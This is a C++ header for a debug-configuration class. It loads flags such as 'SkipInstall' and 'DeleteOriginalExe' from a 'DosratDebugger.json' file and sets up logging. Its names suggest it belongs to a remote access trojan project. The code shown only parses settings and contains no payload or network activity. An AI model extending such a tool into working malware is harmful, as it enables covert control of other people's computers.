#pragma once

class Debugger
{
private:
	DirUtils du;

public:
	Log log;

	bool Active = false;
	bool SkipInstall = false;
	bool MakeBuild = false;
	bool DeleteOriginalExe = true;

	Debugger()
	{
		string filePath = du.GetModuleFilePath() + "DosratDebugger.json";

		if (!du.CheckFile(filePath)) return;

		string tmp = du.GetFileContent(filePath);

		if (tmp.empty()) return;

		Json j = Json::parse(tmp);

		Active = j["DebugMode"];
		SkipInstall = j["SkipInstall"];
		MakeBuild = j["MakeBuild"];
		DeleteOriginalExe = j["DeleteOriginalExe"];

		if (Active)
			log = Log(du.GetModuleFilePath() + "Dlog.log");
		else
			log = Log("", false);

		log.Debug = Active;
	}

};